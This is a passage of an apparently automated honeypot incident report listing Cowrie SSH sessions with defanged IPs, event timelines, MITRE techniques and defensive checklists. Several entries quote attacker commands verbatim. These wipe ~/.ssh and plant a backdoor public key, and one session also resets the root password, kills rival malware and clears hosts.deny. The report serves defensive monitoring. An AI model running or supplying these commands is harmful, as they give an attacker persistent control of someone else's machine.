| **Source IP** | `154.57.216[.]142` |
| **First Seen** | 2026-05-31 20:17 |
| **Last Seen** | 2026-05-31 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:17:15` | `cowrie.session.connect` |
| `2026-05-31 20:17:15` | `cowrie.client.version` |
| `2026-05-31 20:17:15` | `cowrie.client.kex` |
| `2026-05-31 20:17:16` | `cowrie.login.success` |
| `2026-05-31 20:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.57.216[.]142` to AbuseIPDB if not already reported
- [ ] Block `154.57.216[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f97200445f67

| Field | Detail |
|---|---|
| **Source IP** | `175.115.87[.]134` |
| **First Seen** | 2026-05-31 20:22 |
| **Last Seen** | 2026-05-31 20:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:22:02` | `cowrie.session.connect` |
| `2026-05-31 20:22:02` | `cowrie.client.version` |
| `2026-05-31 20:22:03` | `cowrie.client.kex` |
| `2026-05-31 20:22:03` | `cowrie.login.success` |
| `2026-05-31 20:22:03` | `cowrie.session.params` |
| `2026-05-31 20:22:03` | `cowrie.command.input` |
| `2026-05-31 20:22:03` | `cowrie.command.failed` |
| `2026-05-31 20:22:04` | `cowrie.log.closed` |
| `2026-05-31 20:22:04` | `cowrie.session.params` |
| `2026-05-31 20:22:04` | `cowrie.command.input` |
| `2026-05-31 20:22:04` | `cowrie.session.file_download` |
| `2026-05-31 20:22:04` | `cowrie.log.closed` |
| `2026-05-31 20:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.115.87[.]134` to AbuseIPDB if not already reported
- [ ] Block `175.115.87[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f80ad05b9b73

| Field | Detail |
|---|---|
| **Source IP** | `175.115.87[.]134` |
| **First Seen** | 2026-05-31 20:22 |
| **Last Seen** | 2026-05-31 20:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:22:06` | `cowrie.session.connect` |
| `2026-05-31 20:22:06` | `cowrie.client.version` |
| `2026-05-31 20:22:06` | `cowrie.client.kex` |
| `2026-05-31 20:22:07` | `cowrie.login.success` |
| `2026-05-31 20:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.115.87[.]134` to AbuseIPDB if not already reported
- [ ] Block `175.115.87[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc96189f121

| Field | Detail |
|---|---|
| **Source IP** | `114.141.59[.]195` |
| **First Seen** | 2026-05-31 20:24 |
| **Last Seen** | 2026-05-31 20:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:24:55` | `cowrie.session.connect` |
| `2026-05-31 20:24:56` | `cowrie.client.version` |
| `2026-05-31 20:24:56` | `cowrie.client.kex` |
| `2026-05-31 20:24:56` | `cowrie.login.success` |
| `2026-05-31 20:24:57` | `cowrie.session.params` |
| `2026-05-31 20:24:57` | `cowrie.command.input` |
| `2026-05-31 20:24:57` | `cowrie.command.failed` |
| `2026-05-31 20:24:57` | `cowrie.log.closed` |
| `2026-05-31 20:24:58` | `cowrie.session.params` |
| `2026-05-31 20:24:58` | `cowrie.command.input` |
| `2026-05-31 20:24:58` | `cowrie.session.file_download` |
| `2026-05-31 20:24:58` | `cowrie.log.closed` |
| `2026-05-31 20:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.141.59[.]195` to AbuseIPDB if not already reported
- [ ] Block `114.141.59[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92d707948df

| Field | Detail |
|---|---|
| **Source IP** | `114.141.59[.]195` |
| **First Seen** | 2026-05-31 20:25 |
| **Last Seen** | 2026-05-31 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:25:00` | `cowrie.session.connect` |
| `2026-05-31 20:25:00` | `cowrie.client.version` |
| `2026-05-31 20:25:00` | `cowrie.client.kex` |
| `2026-05-31 20:25:01` | `cowrie.login.success` |
| `2026-05-31 20:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.141.59[.]195` to AbuseIPDB if not already reported
- [ ] Block `114.141.59[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778fc8d0ad27

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:26 |
| **Last Seen** | 2026-05-31 20:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:26:41` | `cowrie.session.connect` |
| `2026-05-31 20:26:41` | `cowrie.client.version` |
| `2026-05-31 20:26:42` | `cowrie.client.kex` |
| `2026-05-31 20:26:42` | `cowrie.login.success` |
| `2026-05-31 20:26:42` | `cowrie.session.params` |
| `2026-05-31 20:26:42` | `cowrie.command.input` |
| `2026-05-31 20:26:42` | `cowrie.command.failed` |
| `2026-05-31 20:26:43` | `cowrie.log.closed` |
| `2026-05-31 20:26:43` | `cowrie.session.params` |
| `2026-05-31 20:26:43` | `cowrie.command.input` |
| `2026-05-31 20:26:44` | `cowrie.session.file_download` |
| `2026-05-31 20:26:44` | `cowrie.log.closed` |
| `2026-05-31 20:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179626923c05

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:26 |
| **Last Seen** | 2026-05-31 20:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:26:47` | `cowrie.session.connect` |
| `2026-05-31 20:26:47` | `cowrie.client.version` |
| `2026-05-31 20:26:47` | `cowrie.client.kex` |
| `2026-05-31 20:26:48` | `cowrie.login.success` |
| `2026-05-31 20:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ee4b82deb9

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:28 |
| **Last Seen** | 2026-05-31 20:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:28:41` | `cowrie.session.connect` |
| `2026-05-31 20:28:41` | `cowrie.client.version` |
| `2026-05-31 20:28:41` | `cowrie.client.kex` |
| `2026-05-31 20:28:43` | `cowrie.login.success` |
| `2026-05-31 20:28:43` | `cowrie.session.params` |
| `2026-05-31 20:28:43` | `cowrie.command.input` |
| `2026-05-31 20:28:43` | `cowrie.command.failed` |
| `2026-05-31 20:28:43` | `cowrie.log.closed` |
| `2026-05-31 20:28:43` | `cowrie.session.params` |
| `2026-05-31 20:28:43` | `cowrie.command.input` |
| `2026-05-31 20:28:44` | `cowrie.session.file_download` |
| `2026-05-31 20:28:44` | `cowrie.log.closed` |
| `2026-05-31 20:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e6d5fa9f88c

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:28 |
| **Last Seen** | 2026-05-31 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:28:47` | `cowrie.session.connect` |
| `2026-05-31 20:28:47` | `cowrie.client.version` |
| `2026-05-31 20:28:47` | `cowrie.client.kex` |
| `2026-05-31 20:28:48` | `cowrie.login.success` |
| `2026-05-31 20:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d762284955

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:30 |
| **Last Seen** | 2026-05-31 20:31 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:L98soSWbHlBR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:30:53` | `cowrie.session.connect` |
| `2026-05-31 20:30:55` | `cowrie.client.version` |
| `2026-05-31 20:30:55` | `cowrie.client.kex` |
| `2026-05-31 20:30:56` | `cowrie.login.success` |
| `2026-05-31 20:30:56` | `cowrie.session.params` |
| `2026-05-31 20:30:56` | `cowrie.command.input` |
| `2026-05-31 20:30:56` | `cowrie.command.failed` |
| `2026-05-31 20:30:56` | `cowrie.log.closed` |
| `2026-05-31 20:30:56` | `cowrie.session.params` |
| `2026-05-31 20:30:56` | `cowrie.command.input` |
| `2026-05-31 20:30:56` | `cowrie.session.file_download` |
| `2026-05-31 20:30:56` | `cowrie.log.closed` |
| `2026-05-31 20:31:13` | `cowrie.session.params` |
| `2026-05-31 20:31:13` | `cowrie.command.input` |
| `2026-05-31 20:31:13` | `cowrie.log.closed` |
| `2026-05-31 20:31:13` | `cowrie.session.params` |
| `2026-05-31 20:31:13` | `cowrie.command.input` |
| `2026-05-31 20:31:14` | `cowrie.log.closed` |
| `2026-05-31 20:31:14` | `cowrie.session.params` |
| `2026-05-31 20:31:14` | `cowrie.command.input` |
| `2026-05-31 20:31:14` | `cowrie.session.file_download` |
| `2026-05-31 20:31:14` | `cowrie.log.closed` |
| `2026-05-31 20:31:15` | `cowrie.session.params` |
| `2026-05-31 20:31:15` | `cowrie.command.input` |
| `2026-05-31 20:31:15` | `cowrie.log.closed` |
| `2026-05-31 20:31:15` | `cowrie.session.params` |
| `2026-05-31 20:31:15` | `cowrie.command.input` |
| `2026-05-31 20:31:16` | `cowrie.log.closed` |
| `2026-05-31 20:31:16` | `cowrie.session.params` |
| `2026-05-31 20:31:16` | `cowrie.command.input` |
| `2026-05-31 20:31:16` | `cowrie.command.input` |
| `2026-05-31 20:31:16` | `cowrie.log.closed` |
| `2026-05-31 20:31:17` | `cowrie.session.params` |
| `2026-05-31 20:31:17` | `cowrie.command.input` |
| `2026-05-31 20:31:17` | `cowrie.log.closed` |
| `2026-05-31 20:31:17` | `cowrie.session.params` |
| `2026-05-31 20:31:17` | `cowrie.command.input` |
| `2026-05-31 20:31:18` | `cowrie.log.closed` |
| `2026-05-31 20:31:18` | `cowrie.session.params` |
| `2026-05-31 20:31:18` | `cowrie.command.input` |
| `2026-05-31 20:31:18` | `cowrie.log.closed` |
| `2026-05-31 20:31:18` | `cowrie.session.params` |
| `2026-05-31 20:31:18` | `cowrie.command.input` |
| `2026-05-31 20:31:19` | `cowrie.log.closed` |
| `2026-05-31 20:31:19` | `cowrie.session.params` |
| `2026-05-31 20:31:19` | `cowrie.command.input` |
| `2026-05-31 20:31:20` | `cowrie.log.closed` |
| `2026-05-31 20:31:20` | `cowrie.session.params` |
| `2026-05-31 20:31:20` | `cowrie.command.input` |
| `2026-05-31 20:31:20` | `cowrie.log.closed` |
| `2026-05-31 20:31:20` | `cowrie.session.params` |
| `2026-05-31 20:31:20` | `cowrie.command.input` |
| `2026-05-31 20:31:21` | `cowrie.log.closed` |
| `2026-05-31 20:31:21` | `cowrie.session.params` |
| `2026-05-31 20:31:21` | `cowrie.command.input` |
| `2026-05-31 20:31:21` | `cowrie.log.closed` |
| `2026-05-31 20:31:21` | `cowrie.session.params` |
| `2026-05-31 20:31:21` | `cowrie.command.input` |
| `2026-05-31 20:31:22` | `cowrie.log.closed` |
| `2026-05-31 20:31:23` | `cowrie.session.params` |
| `2026-05-31 20:31:23` | `cowrie.command.input` |
| `2026-05-31 20:31:23` | `cowrie.log.closed` |
| `2026-05-31 20:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc79668878df

| Field | Detail |
|---|---|
| **Source IP** | `114.141.59[.]195` |
| **First Seen** | 2026-05-31 20:31 |
| **Last Seen** | 2026-05-31 20:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:31:01` | `cowrie.session.connect` |
| `2026-05-31 20:31:01` | `cowrie.client.version` |
| `2026-05-31 20:31:01` | `cowrie.client.kex` |
| `2026-05-31 20:31:02` | `cowrie.login.success` |
| `2026-05-31 20:31:02` | `cowrie.session.params` |
| `2026-05-31 20:31:02` | `cowrie.command.input` |
| `2026-05-31 20:31:02` | `cowrie.command.failed` |
| `2026-05-31 20:31:02` | `cowrie.log.closed` |
| `2026-05-31 20:31:03` | `cowrie.session.params` |
| `2026-05-31 20:31:03` | `cowrie.command.input` |
| `2026-05-31 20:31:03` | `cowrie.session.file_download` |
| `2026-05-31 20:31:03` | `cowrie.log.closed` |
| `2026-05-31 20:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.141.59[.]195` to AbuseIPDB if not already reported
- [ ] Block `114.141.59[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdbc64ea1599

| Field | Detail |
|---|---|
| **Source IP** | `114.141.59[.]195` |
| **First Seen** | 2026-05-31 20:31 |
| **Last Seen** | 2026-05-31 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:31:06` | `cowrie.session.connect` |
| `2026-05-31 20:31:06` | `cowrie.client.version` |
| `2026-05-31 20:31:06` | `cowrie.client.kex` |
| `2026-05-31 20:31:06` | `cowrie.login.success` |
| `2026-05-31 20:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.141.59[.]195` to AbuseIPDB if not already reported
- [ ] Block `114.141.59[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55dc078aad2a

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:50 |
| **Last Seen** | 2026-05-31 20:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:50:17` | `cowrie.session.connect` |
| `2026-05-31 20:50:17` | `cowrie.client.version` |
| `2026-05-31 20:50:17` | `cowrie.client.kex` |
| `2026-05-31 20:50:17` | `cowrie.login.success` |
| `2026-05-31 20:50:18` | `cowrie.session.params` |
| `2026-05-31 20:50:18` | `cowrie.command.input` |
| `2026-05-31 20:50:18` | `cowrie.command.failed` |
| `2026-05-31 20:50:18` | `cowrie.log.closed` |
| `2026-05-31 20:50:19` | `cowrie.session.params` |
| `2026-05-31 20:50:19` | `cowrie.command.input` |
| `2026-05-31 20:50:19` | `cowrie.session.file_download` |
| `2026-05-31 20:50:19` | `cowrie.log.closed` |
| `2026-05-31 20:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796ed4aec039

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:50 |
| **Last Seen** | 2026-05-31 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:50:23` | `cowrie.session.connect` |
| `2026-05-31 20:50:23` | `cowrie.client.version` |
| `2026-05-31 20:50:23` | `cowrie.client.kex` |
| `2026-05-31 20:50:24` | `cowrie.login.success` |
| `2026-05-31 20:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.26[.]93` to AbuseIPDB if not already reported
- [ ] Block `101.126.26[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c793bd9dfde2

| Field | Detail |
|---|---|
| **Source IP** | `101.126.26[.]93` |
| **First Seen** | 2026-05-31 20:52 |
| **Last Seen** | 2026-05-31 20:52 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 20:52:11` | `cowrie.session.connect` |
| `2026-05-31 20:52:11` | `cowrie.client.version` |
| `2026-05-31 20:52:11` | `cowrie.client.kex` |
| `2026-05-31 20:52:19` | `cowrie.login.success` |
| `2026-05-31 20:52:20` | `cowrie.session.params` |
| `2026-05-31 20:52:20` | `cowrie.command.input` |
